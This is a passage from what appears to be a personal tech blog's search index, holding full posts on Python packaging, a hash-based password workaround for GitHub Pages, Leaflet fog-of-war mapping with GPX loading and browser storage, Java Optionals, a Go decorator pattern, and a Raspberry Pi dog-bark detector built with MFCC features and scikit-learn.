author=&#39;Adrian Galera&#39;, # provides the author of the package\n      author_email=&#39;&#39;,\n      python_requires=&#39;&amp;gt;=3.6.*&#39;, # details the version compatibility.\n      packages=find_packages(), # the find_packages method scans the folder for modules and sub-modules\n      install_requires=install_requires,\n      tests_require=tests_require,\n      entry_points={\n          &#39;console_scripts&#39;: [\n              &#39;example-cli = examplecli.entrypoint:start&#39;, # required for click framework to find the starting point\n          ]\n      }\n      )\n\n\nIn order to generate the wheel file, the user should run the following command:\n\nEXAMPLE_CLI_VERSION=$VERSION python3 setup.py sdist bdist_wheel\n\n"
} ,
  
  {
    "title"    : "Password protection for Github Pages",
    "category" : "",
    "tags"     : " javascript, browser, github-pages, security",
    "url"      : "/github-pages-password/",
    "date"     : "September 6, 2022",
    "excerpt"  : "In this article I implement a workaround to protect with password a static page stored in Github pages.\n\n\n\nI am using Github Pages to store static pages without any backend. That’s super nice, but now I need to serve a password protected page. Wha...",
  "content"  : "In this article I implement a workaround to protect with password a static page stored in Github pages.\n\n\n\nI am using Github Pages to store static pages without any backend. That’s super nice, but now I need to serve a password protected page. What kind I do?\n\nI have found a guy that asked the same question and have a nice proposal: use hashes. You can find his code here: https://github.com/chrissy-dev/protected-github-pages. His solution is older than walking.\n\nHash to the rescue\n\nThe workaround is really simple, you choose a password that can be hard to guess. Hint: use some page that computes the password strength like: https://www.idstrong.com/tools/password-strength-checker/.\n\nWith that word, you generate the sha1 hash:\n\necho -n &quot;&amp;lt;your-word&amp;gt;&quot; | openssl sha1\ncb1dc474e185777dad218b7d60f2781723d8190b\n\n\nNow generate a folder with that text in the root of the repo and place all the password protected content there.\n\nThen in the root of the repository place an index.html that will have a password form.\n\nWhen the user enters the password, compute the sha1 hash of the field they just enter. Then, perform a redirection to the URL, if the answer is different than 200, the folder has not been found, so the password is invalid.\n\nThat’s the code that does the magic:\n\nfunction login(secret) {\n            var hash = sha1(secret)\n            var url = hash + &quot;/index.html&quot;\n            var alert = document.querySelectorAll(&#39;[data-id=&quot;alert&quot;]&#39;)\n\n            var request = new XMLHttpRequest()\n            request.open(&#39;GET&#39;, url, true)\n\n            request.onload = function () {\n                if (request.status &amp;gt;= 200 &amp;amp;&amp;amp; request.status &amp;lt; 400) {\n                    window.location = url\n                } else {\n                    parent.location.hash = hash\n                    alert[0].style.display = &#39;block&#39;\n                    password[0].setAttribute(&#39;placeholder&#39;, &#39;Incorrect password&#39;)\n                    password[0].value = &#39;&#39;\n                }\n            }\n            request.onerror = function () {\n                parent.location.hash = hash\n                alert[0].style.display = &#39;block&#39;\n                password[0].setAttribute(&#39;placeholder&#39;, &#39;Incorrect password&#39;)\n                password[0].value = &#39;&#39;\n            }\n            request.send()\n        }\n\nbutton[0].addEventListener(&quot;click&quot;, function () {\n    login(password[0].value)\n})\n\nThat works really nice, however, once the authentication is passed, a user can share the link and the authentication will be bypassed. We need an extra layer of security\n\nAvoid sharing the link\n\nYou can make a very easy implementation to make short-lived links. The page that provides the autentication can add a not-valid-after parameter to the URL. For example:\n\nrequest.onload = function () {\n        if (request.status &amp;gt;= 200 &amp;amp;&amp;amp; request.status &amp;lt; 400) {\n            let nva = new Date().getTime() + 1_000\n            window.location = url + &quot;?nva=&quot;+nva\n...\n\nWith this piece of code, the links are only valid for 1 second.\n\nIn the index.html of the protected content, we only need to check for the not-valid-after parameter:\n\nlet paramString = window.location.search.split(&#39;?&#39;)[1];\nlet queryString = new URLSearchParams(paramString);\nlet nva = parseInt(queryString.get(&quot;nva&quot;))\nlet now = new Date().getTime()\nif (Number.isNaN(nva) || now &amp;gt; nva) {\n    console.log(&quot;not-valid-after invalid, going to redirect to /&quot;)\n    window.location = &quot;/&quot;\n}\n\nThis piece of the code reads the nva parameter from the URL and checks if it’s not present or if it’s too late. In any of those cases, it redirects to the root; where the password form appears.\n\nAt the end you should end up with a file structure similar to:\n├── CNAME\n├── f2daa.... (hash)\n│   ├── css\n│   │   ├── style.css\n│   │   └── style.css.map\n│   ├── fonts\n│   │   ├── flaticon.css\n│   │   ├── Flaticon.eot\n│   │   ├── Flaticon.svg\n│   │   ├── Flaticon.ttf\n│   │   ├── Flaticon.woff\n│   ├── images\n│   │   ├── blog\n│   │   │   ├── img-1.jpg\n│   │   │   ├── img-2.jpg\n│   │   │   └── img-3.jpg\n│   ├── index.html (html protected under password)\n│   ├── js\n│   │   ├── bootstrap.min.js\n│   │   ├── script.js\n│   ├── README.md\n└── index.html (html acting as a login page)\n\n"
} ,
  
  {
    "title"    : "Browser storage",
    "category" : "",
    "tags"     : " javascript, browser, persistence",
    "url"      : "/browser-storage/",
    "date"     : "July 23, 2022",
    "excerpt"  : "In this article I discuss some techniques to store data in the browser. This way the web applications do not require a expensive backend, every customer stores its information in the browser.\n\n\n\nThis is part of my series of articles about leaflet:...",
  "content"  : "In this article I discuss some techniques to store data in the browser. This way the web applications do not require a expensive backend, every customer stores its information in the browser.\n\n\n\nThis is part of my series of articles about leaflet:\n\n\n  Leaflet fog of war\n  Draw a polygon from markers in leaflet\n  Load and display GPX in leaflet\n  Browser storage\n\n\nFor the implementation of fog of war map, I do not want to spend any time dealing with the backend. Besides that, I don’t want to spent not even a cent on the storage of data.\n\nIn this scenario, the visited areas are stored into a huge GeoJSON document. The persistence should store that document so the user does not need to re-create it every time.\n\nHowever, how the can the data be persisted without any backend? It turns out the browser offers some persistence capabilities, let’s analyse them.\n\nLocal storage\n\nThe first approach is to use browser’s local storage. This storage is a key-value storage which has a very simple synchronous contract:\n\nwindow.localStorage.setItem(&quot;a&quot;,&quot;b&quot;)\nwindow.localStorage\n&amp;gt; Storage {a: &#39;b&#39;, length: 1}\nwindow.localStorage.getItem(&quot;a&quot;)\n&amp;gt; &#39;b&#39;\n\n\nThis storage is really simple and easy to use, however it comes at the cost of have a very limited space in the order of few MBs.\n\nThe original approach was to use this type of storage, however I reached the size limit really fast when I started to import GPX files.\n\nCaches\n\nReading a little bit more on browser storage capabilities, I discovered the caching mechanism. This is designed to store the answers from HTTP calls, hence its name. However, its original purpose can be violated to store any kind of data, not only HTTP responses.\n\nThis new API is asynchronous, that make the transition from local storage to caches a little bit painful, but it’s a price we have to pay for having a massive amount of storage capability. According to this article the storage availability is based on the amount of storage available on the disk.\n\nfunction GeoJsonStorage() {\n    const CACHE_NAME = &quot;geojson&quot;\n    const CACHE_KEY = &quot;https://xxxx/geojson.json&quot;\n    return {\n        set: function (geojson) {\n            caches.open(CACHE_NAME)\n                .then(function (cache) {\n                    cache.put(CACHE_KEY, new Response(JSON.stringify(geojson)));\n                })\n                .catch(err =&amp;gt; console.log(`Cannot open the cache, error: ${err}`))\n        },\n\n        get: async function () {\n            return caches.open(CACHE_NAME)\n                .then(cache =&amp;gt; cache.match(CACHE_KEY))\n                .then(response =&amp;gt; {\n                    if (response)\n                        return response.json()\n                    return undefined\n                })\n                .catch(err =&amp;gt; console.log(`Cannot get the contents from the cache, error: ${err}`))\n        },\n        clear: function () {\n            caches.delete(CACHE_NAME)\n        }\n    }\n}\n\nThe key to store arbitrary data into the caches mechanism is to trick the system saying that the cache key is an HTTP request: https://xxxx/geojson.json. This way, you can put and retrieve a JSON inside the caching mechanism\n"
} ,
  
  {
    "title"    : "Load GPX in leaflet",
    "category" : "",
    "tags"     : " leaflet, javascript, browser, gis, gpx",
    "url"      : "/leaflet-load-gpx/",
    "date"     : "July 22, 2022",
    "excerpt"  : "\n\nFollowing up from the previous article about implementing the fog of war in leaflet, I want to be able to load a GPX file and display it in the map.\n\n\n\nThis is part of my series of articles about leaflet:\n\n\n  Leaflet fog of war\n  Draw a polygon ...",
  "content"  : "\n\nFollowing up from the previous article about implementing the fog of war in leaflet, I want to be able to load a GPX file and display it in the map.\n\n\n\nThis is part of my series of articles about leaflet:\n\n\n  Leaflet fog of war\n  Draw a polygon from markers in leaflet\n  Load and display GPX in leaflet\n  Browser storage\n\n\nNow, that I can draw paths with some distance in the map, I want to be able to load GPX files. Those files store geographical information in the way of latitude,longitude and optionally elevation, time and other information. Those documents are XML based, so it should be easy to parse.\n\nLoad file\n\nHow to load any file from the computer from the browser? window.showOpenFilePicker allows the browser to opens a file picker. That file picker can be customised to load files of only one type, to allow multiple files, etc. Take into account that is an async operation, so you’ll have to deal with promises:\n\nconst gpxPickerOpts = {\n    types: [\n        {\n            description: &#39;GPX Files&#39;,\n            accept: {\n                &#39;application/gpx+xml&#39;: [&#39;.gpx&#39;]\n            }\n        }\n    ],\n    multiple: true\n};\nconst fileHandlers = await window.showOpenFilePicker(gpxPickerOpts);\nfor (let fh of fileHandlers) {\n    const file = await fh.getFile();\n    const content = await file.text();\n}\n\nIn this case, we want to load multiple GPX files. The window.showOpenFilePicker methods returns an array of file handlers which later we need to open and consume. file.text() operation returns the full contents of the file in text.\n\nParse the GPX\n\nNow that we have the text contents of the file, we must extract the relevant information, i.e. latitude and longitude of the points stored. Since GPX is XML-based, we can use two approaches to parse the file:\n\n\n  SAX: Simple API for XML. Event based, when a new node is detected, an event is generated and passed to the event handler. Extremely efficient but complicated to implement.\n  DOM: Document Object Mapper. It parses the file in one go. If the documents are big can lead to performance decrease, but it’s extremely easy to implement.\n\n\nSince this is a toy project, let’s use DOM because of its simplicity:\n\nconst _xmlTrackPointToLatLng = (trkpoint) =&amp;gt; {\n    return [parseFloat(trkpoint.attributes.lat.nodeValue), parseFloat(trkpoint.attributes.lon.nodeValue)]\n}\nvar gpxDom = (new DOMParser()).parseFromString(content, &#39;text/xml&#39;);\nconst trackPoints = Array.from(gpxDoc.getElementsByTagName(&quot;trkpt&quot;));\nconst latlngs = trackPoints.map((trkpnt) =&amp;gt; container._xmlTrackPointToLatLng(trkpnt))\n\n\nThis snippet generated the DOM from the contents of the GPX file. Later extract the elements in the DOM tree that belongs to points in the track: &amp;lt;trkpt&amp;gt;. Then, every tag is processed to extract latitude and longitude.\n\nIn this point, we have an array of points with latitude/longitude pairs.\n\nDisplay the GPX\n\nGPX can have a massive amounts of points, I have some of them with 20k points. In order to display it smoothly, I’m grouping the points in groups of 200 to draw the polygon like in the previous article (Draw a polygon from markers in leaflet):\n\nconst  _group = (arr, n) =&amp;gt; {\n    const res = [];\n    let limit = 0;\n    while (limit + n &amp;lt;= arr.length) {\n        res.push(arr.slice(limit, n + limit));\n        limit += n\n    }\n    return res\n}\nconst groups = container._group(latlngs, 200)\nvar polygonGeoJSON = undefined\nfor (let group of groups) {\n    const polLatLng = _joinLinesInPolygon(group) //from previous article\n    const pol = L.polygon(polLatLng).toGeoJSON()\n    if (!polygonGeoJSON) {\n        polygonGeoJSON = pol\n    } else {\n        polygonGeoJSON = turf.union(pol, polygonGeoJSON)\n    }\n}\n\n\nThis _group function creates batches of 200 points in order to perform the joinin of those points into a polygon. Once a polygon is created, I’m merging them with the turf library by performing a union.\n\nThis way of displaying GPX files produces very appealing representation such as:\n\n\n\nHere you can see it in action: https://www.agalera.eu/leaflet-fogofwar/\n"
} ,
  
  {
    "title"    : "Draw a polygon from markers in leaflet",
    "category" : "",
    "tags"     : " leaflet, javascript, browser, gis",
    "url"      : "/leaflet-draw-polygon-markers/",
    "date"     : "July 21, 2022",
    "excerpt"  : "\n\nFollowing up from the previous article about implementing the fog of war in leaflet, I want to add some markers to the map and to create a polygon that joins them.\n\nLet’s see how I manage to do that.\n\n\n\nThis is part of my series of articles abou...",
  "content"  : "\n\nFollowing up from the previous article about implementing the fog of war in leaflet, I want to add some markers to the map and to create a polygon that joins them.\n\nLet’s see how I manage to do that.\n\n\n\nThis is part of my series of articles about leaflet:\n\n\n  Leaflet fog of war\n  Draw a polygon from markers in leaflet\n  Load and display GPX in leaflet\n  Browser storage\n\n\nThe user can click the map to generate markers that follow a route, e.g. a road, a trail, etc.. and later join those markers to create a complex polygon. This reflects the fact that you have visited the road, but you only have certain visibility of the environment (maybe 10 meters or so):\n\n\n\n\n\n\n\n\n\n\n\n\nMarkers\n\n\nJoined markers into a polygon\n\n\n\n\nJoin markers into a polygon\n\nWhen a new marker is added, it is added to the map and to an internal array:\n        onAdd: function (e) {\n            const marker = new L.Marker(e.latlng)\n            container.markers.push(marker.addTo(map))\n        }\n\nWhen the user click on a button, those markers are processed and joined into a polygon by using the jsts library\n\nconst _joinLinesInPolygon = (points) =&amp;gt; {\n    const pointToGeomCoordinate = (p) =&amp;gt; {\n        if (p.lat &amp;amp;&amp;amp; p.lng)\n            return new jsts.geom.Coordinate(p.lat, p.lng)\n        return new jsts.geom.Coordinate(p[0], p[1])\n    }\n\n    const toLeafletPoint = (p) =&amp;gt; {\n        return [p.x, p.y]\n    }\n\n    const meters = 40 //the user can selected the width of the generated polygon\n    const distance = (meters * 0.0001) / 111.12; //Geometry aproximations\n    const geometryFactory = new jsts.geom.GeometryFactory();\n    const pathCoords = points.map((p) =&amp;gt; pointToGeomCoordinate(p));\n    const shell = geometryFactory.createLineString(pathCoords);\n    const polygon = shell.buffer(distance);\n    const polygonCoords = polygon.getCoordinates();\n    return polygonCoords.map((coord) =&amp;gt; toLeafletPoint(coord))\n}\n\nThis method converts the leaflet points into a format the jsts libray can understand and perform the buffer operation in jsts which does all the magic. From the API definition: buffer computes a buffer area around this geometry having the given width.\n\nLater the coordinates are transformed into the leaflet format.\n\nHere you can see it in action: https://www.agalera.eu/leaflet-fogofwar/\n"
} ,
  
  {
    "title"    : "Leaflet fog of war",
    "category" : "",
    "tags"     : " leaflet, javascript, browser, gis",
    "url"      : "/leaflet-fog-of-war/",
    "date"     : "July 20, 2022",
    "excerpt"  : "\n\nWhen I was playing age of empires the map was all in black color at the beginning. As long as you explore the map, the black color is removed discovering what it was hidden behind.\n\nI wanted to implement something similar to show all the trails,...",
  "content"  : "\n\nWhen I was playing age of empires the map was all in black color at the beginning. As long as you explore the map, the black color is removed discovering what it was hidden behind.\n\nI wanted to implement something similar to show all the trails, routes, paths, roads, streets, etc that I have discovered. I’ll describe the callenges I have found in a series of articles.\n\n\n\nThis is part of my series of articles about leaflet:\n\n\n  Leaflet fog of war\n  Draw a polygon from markers in leaflet\n  Load and display GPX in leaflet\n  Browser storage\n\n\nAge of empires… what a great game\n\n\n\nI want to create something similar to the map in Age of Empires. A map where everything is hidden until you discovered. This way you could check how much of your city you know, or where to search for new places to visit.\n\nI have worked many times before with leaflet js, a nice library to display maps and geographic information. It has a nice ecosystem of plugins, so I’ve checked if someone has something similar implemented and YES!\n\nLeaflet.Mask already implemented a plugin that mask all the map and displays the area specified in the begining.\n\n\n\n\n\nHowever, it does not fit my requirements as I want to add places dynamically. So, let’s implement our own thing …\n\nImplementing my own Leaflet Mask\n\nTaking Leaflet.Mask as a base, I will modify it a bit in order to be able to add the visited area dynamically.\n\nThe key for this to succeed was to understand how the polygon has to be created in leaflet:\n\nscotland = L.polygon([\n  [\n    [60, -13],\n    [60, 0],\n    [50, 4],\n    [50, -13],\n  ],\n  [\n    [55.7, -4.5],\n    [56, -4.5],\n    [56, -4],\n    [55.7, -4],\n  ],\n]);\nscotland.addTo(map);\n\n\n\n\nIn order to draw the polygon, the user might pass the list of latitude longitudes and a second optional argument that defines the holes of that polygon.\n\nFinally the code looked something similar to:\n\n _setMaskLayer: function () {\n            if (this.masklayer) {\n                this.removeLayer(this.masklayer)\n            }\n\n            var allWorld = this._coordsToLatLngs(this._allWorldCoordinates)\n            var latlngs = [allWorld]\n\n            this._holes.forEach((hole) =&amp;gt; latlngs.push(this._coordsToLatLngs(hole)))\n\n            var layer = new L.Polygon(latlngs, this.options);\n            this.masklayer = layer\n            this.addLayer(layer);\n        },\n\n\nThe plugin reads the input data as GeoJSON and store the visited places latitude and longitude in the this._holes variable. Later on, this array is iterated in order to build the holes that leaflet will draw into the polygon. Finally the created polygon is added to the map. When the method is called, the polygon is removed to be able to redraw it.\n\nHere you can see it in action: https://www.agalera.eu/leaflet-fogofwar/\n\nBut wait … that’s not all, I want the fulfill the following requirements:\n\n  I need a way to draw the areas I visisted, covered in the article: Draw a polygon from markers in leaflet\n  Load a GPX and display it in the map, covered in the article: Load and display GPX in leaflet\n  I don’t want to spent any money in this, so the storage will be browser based. This is covered in the article: Browser storage\n\n"
} ,
  
  {
    "title"    : "Combine two Java Optionals",
    "category" : "",
    "tags"     : " java9, optional",
    "url"      : "/combine-two-optionals/",
    "date"     : "June 3, 2022",
    "excerpt"  : "I was implementing a searching algorithm and I had to search for two things. In this article I describe how I implemented combining two Java optionals.\n\n\n\nThe algorithm had to do something similar to:\n\n\n  Search inside an array the first item star...",
  "content"  : "I was implementing a searching algorithm and I had to search for two things. In this article I describe how I implemented combining two Java optionals.\n\n\n\nThe algorithm had to do something similar to:\n\n\n  Search inside an array the first item starting by A\n  If none is found, search the first item starting by B\n  If none is found, throw an Exception\n\n\nCommon code:\n\npublic abstract class ItemFinder {\n\n    protected abstract String findItem(List&amp;lt;String&amp;gt; items);\n\n    protected Optional&amp;lt;String&amp;gt; findFirstItemStartingWithA(List&amp;lt;String&amp;gt; items) {\n        return findFirstItemStartingWith(&quot;A&quot;, items);\n    }\n\n    protected Optional&amp;lt;String&amp;gt; findFirstItemStartingWithB(List&amp;lt;String&amp;gt; items) {\n        return findFirstItemStartingWith(&quot;B&quot;, items);\n    }\n\n    private Optional&amp;lt;String&amp;gt; findFirstItemStartingWith(String letter, List&amp;lt;String&amp;gt; items) {\n        return items.stream()\n            .filter(item -&amp;gt; item.startsWith(letter))\n            .findFirst();\n    }\n}\n\n\nJava 8\n\nThe only way to achieve this with Optionals before Java 9 was to cascade the Optional call:\n\n     public String findItem(List&amp;lt;String&amp;gt; items) {\n        return findFirstItemStartingWithA(items)\n            .orElseGet(() -&amp;gt; findFirstItemStartingWithB(items)\n                .orElseThrow(() -&amp;gt; new RuntimeException(&quot;no item found&quot;)));\n    }\n\n\nThe alternative flow is cascaded in the orElseGet, which is a little bit hard to read\n\nJava &amp;gt; 9\n\nIn Java 9, the Optional.or method is introduced, which enhaces a lot the code for these scenarios. The code above can be rewritten in a much more understandable fashion:\n\n    public String findItem(List&amp;lt;String&amp;gt; items) {\n        return findFirstItemStartingWithA(items)\n            .or(() -&amp;gt; findFirstItemStartingWithB(items))\n            .orElseThrow(() -&amp;gt; new RuntimeException(&quot;no item found&quot;));\n    }\n\n"
} ,
  
  {
    "title"    : "Golang abstract class",
    "category" : "",
    "tags"     : " golang, design-patterns, architecture",
    "url"      : "/golang-abstract-class/",
    "date"     : "September 24, 2021",
    "excerpt"  : "I’m doing a side project using golang, and I have a use case where I’d use an abstract class in Java.  Unfortunately, in golang the concept of classes does not exist.\n\nIn this article I describe how can I implement the behaviour I want without abs...",
  "content"  : "I’m doing a side project using golang, and I have a use case where I’d use an abstract class in Java.  Unfortunately, in golang the concept of classes does not exist.\n\nIn this article I describe how can I implement the behaviour I want without abstract class.\n\n\n\nI’m implementing an alert system in golang. When the alert needs to be activated, I want to play a sound through speakers and blink some LEDs for some period of time.\n\nThe behavior is quite simple, it needs to provide an implementation to enable the signaler, disable and query.\n\nWe will create two clases, one for playing sounds and another one for blinking the LEDs. And an abstract class to implement the shutdown after some period of time. Something similar to:\n\nabstract class Signaler {\n    public void enableForTime(int seconds) {\n        //Implementation to enable the signaler for x seconds\n    }\n    public void disable() {\n        //Disable the signalers and cancel any pending timer\n    }\n    abstract void enable();\n    abstract void disableSignaler();\n}\nclass LedSignaler extends Signaler {\n    @Override\n    void enable() {\n        //enable the LEDs\n    }\n    @Override\n    void disableSignaler() {\n        //disable the LEDs\n    }\n}\nclass SoundSignaler extends Signaler {\n    @Override\n    void enable() {\n        //enable the speaker\n    }\n    @Override\n    void disableSignaler() {\n        //disable the speaker\n    }\n}\n\n\nThe idea of this is to abstract the concrete implementation to the caller of the signaler.\n\nThis representation will work in any language that supports inheritance and abstract classes.\n\nDecorator pattern\n\nIn golang, the concept of classes does not exist. So, we need to re-architecture the pattern.\n\nInstead of using the abstract class, we can re-think the implementation to use a decorator pattern: https://en.wikipedia.org/wiki/Decorator_pattern.\n\n\n  The decorator pattern is a design pattern that allows behavior to be added to an individual object, dynamically, without affecting the behavior of other objects from the same class\n\n\nIt works by defining an interface that will have multiple implementation, we can add new functionalities by adding new implementations. Let’s go define the interface of the signaler:\n\ntype Signaler interface {\n\tEnable()\n\tIsEnabled() bool\n\tDisable()\n}\n\nNow, we can do the implementation of the sound signaler. To implement and interface in golang you need to provide a struct that has the same methods as the interface.\n\ntype soundSignaler struct {\n    \n}\nfunc (s *soundSignaler) Enable() {\n\ts.enabled = true\n    //start playing sound\n}\n\nfunc (s *soundSignaler) Disable() {\n\ts.enabled = false\n    //stop playing sound\n}\n\nfunc (s *soundSignaler) IsEnabled() bool {\n\treturn s.enabled\n}\n\nOK, now let’s do the implementation of the temporal execution of the signaler. In order to do so, let’s create a new type that implement Signaler:\n\ntype temporalSignaler struct {\n\tconfig          *config.AlarmConfig\n\ttimers          []signalerTimer\n\tdelayedExecutor delayedExecutor\n\tsignaler        Signaler\n}\n\nfunc (s *temporalSignaler) Enable() {\n\ts.signaler.Enable()\n\tvar t = s.delayedExecutor.executeAfterSeconds(s.config.SecondsStopSignals, func() {\n\t\ts.Disable()\n\t})\n\ts.timers = append(s.timers, t)\n}\n\nfunc (s *temporalSignaler) Disable() {\n\tfor i := 0; i &amp;lt; len(s.timers); i++ {\n\t\ts.timers[i].Stop()\n\t}\n\ts.signaler.Disable()\n}\n\nfunc (s *temporalSignaler) IsEnabled() bool {\n\treturn s.signaler.IsEnabled()\n}\n\nThe key point of this struct, is that we’re holding a Signaler instance on it. We are “decorating” that instance with the temporal disabling functionality. In order to do so, we just need to implement the logic in the type and call the Signaler methods of the decorated instance.\n\nThe most elegant part of this implementation is that we’re defining all the structs as private (name begins with lower case). So, the external modules cannot instantiate them. We can abstract the creation of the sound signaler by creating a factory:\n\nfunc NewSoundSignaler(config *config.Config) Signaler {\n\treturn &amp;amp;temporalSignaler{\n\t\tdelayedExecutor: &amp;amp;defaultDelayedExecutor{},\n\t\tconfig:          &amp;amp;config.Alarm,\n\t\tsignaler: &amp;amp;soundSignaler{\n\t\t\tconfig:   config,\n\t\t\texecutor: &amp;amp;unixCommandExecutor{},\n\t\t},\n\t}\n}\n\n\nExternal modules can call the factory method, and they will receive a Signaler instance, hiding effectively the implementation details of the temporal execution and sound playback.\n"
} ,
  
  {
    "title"    : "Implementing a dog bark detector",
    "category" : "",
    "tags"     : " python, ml, audio, scikit, librosa, raspberry-pi, vlc, bash",
    "url"      : "/bark-detector/",
    "date"     : "July 18, 2021",
    "excerpt"  : "\n\nMy dog has a little bit of separation anxiety so when we leave him alone, he barks some times.\n\nWe are training him to be home-alone and we want to know if he barks or not when we are not home.\n\nLet&#39;s implement a bark detector!\n\n\n\nBasics\n\nTime r...",
  "content"  : "\n\nMy dog has a little bit of separation anxiety so when we leave him alone, he barks some times.\n\nWe are training him to be home-alone and we want to know if he barks or not when we are not home.\n\nLet&#39;s implement a bark detector!\n\n\n\nBasics\n\nTime representation\n\nWhat is audio and how is its digital representation? It’s basically an array of float values containing a value from -1 to 1.\n\n\n\n\n\n\n\n\n\nTemporal representation of an audio signal\n\n\n\n\nThis representation shows the temporal evolution of the audio signal over time. This is very variable and it’s really difficult to extract any relevant feature from this representation.\n\nFrequency representation\n\nSo, instead of using the temporal representation, let’s observe the frequency representation:\n\n\n\n\n\n\n\n\n\nFrequency representation of an audio signal\n\n\n\n\nThe x axis is the time of the audio signal and the y axis is the values of the frequencies. Each color in the vertical axis correspond to a different value of the power on that certain frequency.\n\nNote that the time of the plot is doubled respect with the time representation, this is because the signal is combined with itself to generate the frequency representation.\n\nThis representation shows the evolution of the different frequency amplitudes over time.\n\nWithout even listening the sound, we can try to analise it checking the time/frequency characteristic. We see some peaks in the time representation that match with high energy in the low frequencies.\n\nThe good thing about frequency representation is that it cancel noise because usually its energy is spread over all frequencies. Besides that, each sound has a characteristic frequency footprint. So, it’s very convinient to extract the features of the sound in the frequency domain.\n\nMel Frequency Cepstral Co-efficients (MFCC)\n\nQuoting from https://iq.opengenus.org/mfcc-audio/:\n\n\n  MFC is a representation of the short-term power spectrum of a sound, based on a linear cosine transform of a log power spectrum on a nonlinear mel scale of frequency.\n\n\nOk, what does it mean? It’s an improved frequency representation but applying optimizations based on the characteristics of human hearing. Usually MFCC are obtained like this:\n\n\n  Take the Fourier transform of the audio signal to get the frequency representation.\n  Map the powers of the spectrum to the mel scale. This scale approximates the spectrum to be more like what humans hear.\n  Take the logs of the powers at each of the mel frequencies.\n  Take the discrete cosine transform (DCT) of the list of mel log powers. This will remove redudant information as in non-changing information.\n  The MFCCs are the amplitudes of the resulting spectrum.\n\n\n\n\n\n\n\n\n\n\nMFCC representation of an audio signal\n\n\n\n\nWe can use librosa library to load the audio and extract the MFCC features.\n\nThe x axis is time, the y axis is the different MFCC coefficients computed (20 in this example). The color shows the value MFCC coefficient for certain time and coefficient.\n\nIt’s not obvious to see anything in this plot, but it represents the frequency information in a format the computer can use to understand the characteristics of this sound.\n\nGetting the dataset\n\nIn this article I describe the little device I made to feed my dog while I’m away. So I’ll re-use the same device and plug it an old unused webcam that has a microphone.\n\nI did not want to complicate my life much and I created a simple script that uses vlc to stream the audio obtained by the webcam mic and store it as mp3. In order to analyse the files easier I run the script every minute so I have recordings of 60 seconds duration:\n\n#!/bin/bash\nTIMEOUT=60\nFILE_NAME=&quot;/home/pi/dogfeeder-audios/dogfeeder-audio-$(date +&#39;%Y_%m_%d_%H_%M_%S&#39;).mp3&quot;\ntimeout &quot;$TIMEOUT&quot; cvlc --no-video alsa://plughw:1 --sout=&quot;#transcode{vcodec=none,acodec=mp3,ab=128,\nchannels=2,samplerate=44100}:duplicate{dst=std{access=http,mux=mp3,dst=:8087},dst=std{access=file,mux=wav,\ndst=$FILE_NAME}}&quot; &amp;amp;\n\n\nThe syntax of vlc is really ugly :( . But if you read it carefully, you will see that we’re telling vlc to transcode the audio coming from alsa://plughw:1 device (webcam microphone) to mp3 at 128 kbps (decent compression rate). After that, stream the generated mp3 via HTTP on port 8087 and store the mp3 data on the given filename.\n\nIn order to don’t flood the SD card of the Raspberry Pi I run the following script each 15 minutes. It gets the files older than 15 minutes, copy them to a NAS and remove them from the Raspberry Pi disk.\n\n#!/bin/bash\nMINUTES_ALLOWED=15\nFILES_TO_DELETE=$(find /home/pi/dogfeeder-audios -type f -mmin +&quot;$MINUTES_ALLOWED&quot; -exec ls {} +)\n\nfor file in $FILES_TO_DELETE; do\n    scp &quot;$file&quot; admin@diskstation.local:/volume1/data/dogfeeder-audios/.\n    rm &quot;$file&quot;\ndone\n\n\nTraining the model\n\nI’ve been recording for 3 days and we made some exits to keep him alone. Up to this point we have enough data to train the model. However, we have 60 min * 24 h * 3 days = 4320 files and need to classify them manually. Will we do that manually? Absolutely not!\n\nWe can pre-process the dataset and check for files that have something different than noise.\n\n\n\n\n\n\nFile with only noise\nFile with unclassified audio event\n\n\nSince my dog’s barks are quite loud we can safely discard all files whose maximum amplitude is lower than 0.25. This way, we could reduce a lot the amount of files that need to be manually classified as bark.\n\nCharacterization of a bark\n\nAs mentioned before, we’ll discard files whose amplitude is lower than 0.25. Listening to multiple files with bark, we can observe that each bark more or less lasts for 1 second.\n\n\n\n\n&amp;lt;img src=&quot;/assets/img/posts/bark-detector/bark.png&quot; alt=&quot;Bark signal/&amp;gt;\n\n\n\n\n\n    \n\n\n\n\n\nTime representation of an audio signal containing a bark\n\n\n\n\nLabelling the dataset\n\nSo, the strategy for labelling the dataset will be:\n\n\n  Download the whole dataset.\n  Discard the not interesting files (files without any sound event) by checking the maximum amplitude.\n  Extract chunks of 1 seconds from them, run again the algorithm to check sound events on the one-second chunks.\n  Manually listen to the chunks and classify them as bark or not. You can default the labelling to “Not Bark” and this way you only classify events that are barks.\n\n\nThe implementation of this is quite simple: write every chunk filename in a CSV and and a 0 or 1 signaling the presence of a bark or not:\n\nchunks/dogfeeder-audio-2021_07_16_18_49_01_23.wav,0\nchunks/dogfeeder-audio-2021_07_16_18_49_01_24.wav,1\nchunks/dogfeeder-audio-2021_07_16_18_49_01_25.wav,0\n\n\nOnce we have the dataset labelled, we can go file by file and extract the MFCC features of every one-second file:\n\ndef extract_mfcc(filename):\n    y, __ = librosa.load(filename, mono=True, sr=sample_rate)\n    mfcc_2D = librosa.feature.mfcc(y, sr=sample_rate, n_mfcc=100)\n    mfcc_1D = mfcc_2D.flatten()\n    scaler = MinMaxScaler()\n    mfccs_sc = scaler.fit_transform(np.array(mfcc_1D).reshape(-1, 1))\n    return mfccs_sc.flatten()\n\n\nMFCC values can go from [-Inf, Inf], however when I was playing with different algorithms, some of them did not accept negative values, so I scaled the values of MFCC to [0, Inf] using MinMaxScaler.\n\nOnce we have the MFCC features for all the dataset, we can split the dataset into training and test dataset using:\n\nfrom sklearn.model_selection import train_test_split\nX_train, X_test, y_train, y_test = train_test_split(\n        X, Y, random_state=42, test_size=0.33)\n\n\nAfter that, I’ve assesed the prediction performance of Naive Bayes classifier and Logistic Regression classifiers:\n\n    # Naive bayes\n    print(&quot;Training naive bayes ...&quot;)\n    mnb = MultinomialNB().fit(X_train, y_train)\n    print(&quot;score on test: &quot; + str(mnb.score(X_test, y_test)))\n    print(&quot;score on train: &quot; + str(mnb.score(X_train, y_train)))\n    print(&quot;***************&quot;)\n\n    # Logistic regression\n    print(&quot;Training logistic regression ...&quot;)\n    lr = LogisticRegression(max_iter=1000)\n    lr.fit(X_train, y_train)\n    print(&quot;score on test: &quot; + str(lr.score(X_test, y_test)))\n    print(&quot;score on train: &quot; + str(lr.score(X_train, y_train)))\n\n\nGetting a very good score with the logistic regression, I don’t remember exactly the numbers but were more or less:\n\n\n  Score on test: 0.992\n  Score on traing: 0.996\n\n\nDataset imbalance\n\nThe number of events with barks will be very reduced compared with the events that does not 